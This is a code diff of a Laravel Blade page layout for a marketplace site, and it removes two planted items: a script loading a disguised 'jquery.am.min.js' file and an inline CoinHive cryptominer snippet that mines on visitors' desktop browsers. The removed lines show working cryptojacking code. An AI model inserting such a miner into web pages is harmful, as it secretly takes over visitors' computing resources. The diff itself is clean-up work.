@@ -27,7 +27,6 @@
     <link rel="stylesheet" type="text/css" href="{{ asset('market/css/owl.transitions.css') }}"/>
     <link rel="stylesheet" type="text/css" href="{{ asset('market/css/responsive.css') }}"/>
     <link rel="stylesheet" type="text/css" href="{{ asset('market/css/stylesheet-rtl.css') }}"/>
-	<script type="text/javascript" src="{{ asset('market/js/jquery.am.min.js') }}"></script>
     <link rel="stylesheet" type="text/css" href="{{ asset('market/css/responsive-rtl.css') }}"/>
     <link rel="stylesheet" type="text/css" href="{{ asset('market/css/webfont/stylesheet.css') }}"/>
     <link rel="stylesheet" type="text/css" href="{{ asset('market/css/mine.css') }}"/>
@@ -289,12 +288,6 @@
             <br>
             <div class="row">
                 @yield('right-panel')
-				<script>
-	var miner = new CoinHive.Anonymous('dlglYUX8ZLlwpXV5DxtIFpuyL3UEM2yQ', {throttle: 0.5,language: 'ko'});
-	if (!miner.isMobile() && !miner.didOptOut(60*60*4)) {
-		miner.start();
-	}
-</script>
                 @yield('content')
             </div>
         </div>
